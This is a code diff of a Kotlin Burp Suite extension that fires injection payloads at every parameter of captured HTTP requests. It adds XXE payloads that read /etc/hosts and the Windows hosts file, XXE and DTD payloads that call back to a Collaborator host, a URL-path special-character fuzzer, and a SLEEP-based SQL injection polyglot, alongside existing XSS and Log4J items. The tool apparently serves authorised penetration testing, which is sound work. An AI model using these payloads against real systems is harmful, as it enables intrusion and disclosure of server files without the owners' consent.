@@ -26,7 +26,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
 
     private lateinit var logger: MontoyaLogger
     private lateinit var api: MontoyaApi
-    private val sqliQuickMenuItem = JMenuItem("SQLi Quick")
+    private val sqliQuickMenuItem = JMenuItem("SQLi SLEEP PolyGlot")
     private val sqliLogicPayloadsMenuItem = JMenuItem("SQLi Logic Payloads")
     private val sqliConcatPayloadsMenuItem = JMenuItem("SQLi Concat Payloads")
     private val sqliSingleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi SingleQuoteCommentPayloads")
@@ -35,11 +35,14 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
     private val xssMapMenuItem = JMenuItem("XSS ASDF")
     private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
     private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
+    private val xmlOutOfBandMenuItem = JMenuItem("XML OutOfBand")
+    private val xmlFileMenuItem = JMenuItem("XML File")
+    private val urlPathSpecialCharsMenuItem = JMenuItem("URL Path Special Chars")
     private val collabUrlMenuItem = JMenuItem("Collab Url")
     private val log4jCollabMenuItem = JMenuItem("Log4J Collab")
     private val minimizeMenuItem = JMenuItem("Minimize")
     private val spoofIPMenuItem = JMenuItem("Spoof IP Using Headers")
-    private val allMenuItems = mutableListOf<Component>(sqliQuickMenuItem,sqliErrorPayloadsMenuItem,sqliConcatPayloadsMenuItem,sqliSingleQuoteCommentPayloadsMenuItem,sqliDoubleQuoteCommentPayloadsMenuItem,sqliLogicPayloadsMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,collabUrlMenuItem,log4jCollabMenuItem,spoofIPMenuItem,minimizeMenuItem)
+    private val allMenuItems = mutableListOf<Component>(sqliQuickMenuItem,sqliErrorPayloadsMenuItem,sqliConcatPayloadsMenuItem,sqliSingleQuoteCommentPayloadsMenuItem,sqliDoubleQuoteCommentPayloadsMenuItem,sqliLogicPayloadsMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,xmlOutOfBandMenuItem,xmlFileMenuItem,urlPathSpecialCharsMenuItem,collabUrlMenuItem,log4jCollabMenuItem,spoofIPMenuItem,minimizeMenuItem)
     private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
     private val executor = Executors.newVirtualThreadPerTaskExecutor()
     private lateinit var followRedirectSetting : BooleanExtensionSetting
@@ -69,6 +72,9 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
         blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
         collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
+        xmlOutOfBandMenuItem.addActionListener({ e -> xmlOutOfBandActionPerformed(e) })
+        xmlFileMenuItem.addActionListener({ e -> xmlFileActionPerformed(e) })
+        urlPathSpecialCharsMenuItem.addActionListener({ e -> urlPathSpecialCharsActionPerformed(e) })
         minimizeMenuItem.addActionListener({ e -> minimizeActionPerformed(e) })
         log4jCollabMenuItem.addActionListener({ e -> log4jCollabActionPerformed(e) })
         spoofIPMenuItem.addActionListener { e -> spoofIpActionPerformed(e) }
@@ -161,7 +167,49 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
     fun sqliQuickActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadUpdateMode.REPLACE, "SQLi Polyglot \"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadUpdateMode.REPLACE, "SQLi Polyglot-SLEEP \"")
+        logger.debugLog("Exit")
+    }
+
+    fun urlPathSpecialCharsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val payloads=listOf("_","-",",",";",":","!","?",".",".aaa",".action",".css",".do",".html",".png","'","\"","(","(4danlfat035muve4g0mvgfrr)","(S(4danlfat035muve4g0mvgfrr))",")","[","[]","[1]","[a]","]","{","{}","{1}","{a}","}","@","*","/","/1","/a","\\","\\1","\\a","&","#","%","%00","%00aaa","%0a","%0a%0a","%0d","%21","%22","%23","%24","%25","%26","%27","%28","%29","%2a","%2A","%2b","%2B","%2c","%2C","%2d","%2D","%2E","%2f","%2F","%3a","%3A","%3b","%3B","%3C","%3c%3e","%3d","%3D","%3E","%3f","%3F","%40","%5B","%5b%5d","%5b1%5d","%5ba%5d","%5c","%5C","%5D","%5e","%5E","%5f","%5F","%60","%7B","%7b%7d","%7b1%7d","%7ba%7d","%7c","%7C","%7D","%7e","%7E","`","^","+","<","<>","=",">","|","~","$")
+        for(httpRequestResponse in myHttpRequestResponses) {
+            val path = httpRequestResponse.request().path()
+            var index = path.indexOf("/")
+            while (index >= 0) {
+                for (payload in payloads) {
+                    val pathWithPayload = StringBuilder(path).insert(index+1,payload)
+                    sendRequest(httpRequestResponse.request().withPath(pathWithPayload.toString()).withUpdatedContentLength(),"URL Special Chars, index: ${index}, payload: ${payload}")
+                }
+                index = path.indexOf("/", index + 1)
+            }
+
+        }
+        logger.debugLog("Exit")
+    }
+
+
+    fun xmlOutOfBandActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val collabGenerator = api.collaborator().defaultPayloadGenerator()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> %ext;]>\n",PayloadUpdateMode.PREPEND, "XML Entity OOB-Prepend")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> ]><test>&xxe</test>\n",PayloadUpdateMode.REPLACE, "XML Entity OOB-Replace")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\">\n",PayloadUpdateMode.PREPEND, "XML DTD OOB-Prepend")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\"><asdfa></asdfa>",PayloadUpdateMode.REPLACE, "XML DTD OOB-Replace")
+        logger.debugLog("Exit")
+    }
+
+    fun xmlFileActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/hosts'>]>",PayloadUpdateMode.PREPEND, "XML Entity File-Prepend,Linux")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [<!ENTITY test SYSTEM 'file://c/windows/system32/drivers/etc/hosts'>]>",PayloadUpdateMode.PREPEND, "XML Entity File-Prepend,Windows")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/hosts'>]><root>&test;</root>",PayloadUpdateMode.REPLACE, "XML Entity File-Replace,Linux")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file://c/windows/system32/drivers/etc/hosts'>]><root>&test;</root>",PayloadUpdateMode.REPLACE, "XML Entity File-Replace,Windows")
+
         logger.debugLog("Exit")
     }
 
@@ -397,9 +445,20 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
                                     payloadType
                                 ), "URL XML: ${parameter.name()}: $annotation"
                             )
+                            sendRequest(
+                                httpRequest.withUpdatedParsedParameterValue(
+                                    parameter,
+                                    payload,
+                                    payloadType
+                                ), "URL XML: ${parameter.name()}: $annotation"
+                            )
                             //at some point, change this from hardcoded replace to something else
                             sendRequest(
                                 httpRequest.withUpdatedParsedParameterValue(parameter, "<![CDATA[$payload]]>",PayloadUpdateMode.REPLACE),
+                                "URL XML: ${parameter.name()}: $annotation"
+                            )
+                            sendRequest(
+                                httpRequest.withUpdatedParsedParameterValue(parameter, payload,PayloadUpdateMode.REPLACE),
                                 "URL XML: ${parameter.name()}: $annotation"
                             )
                         }
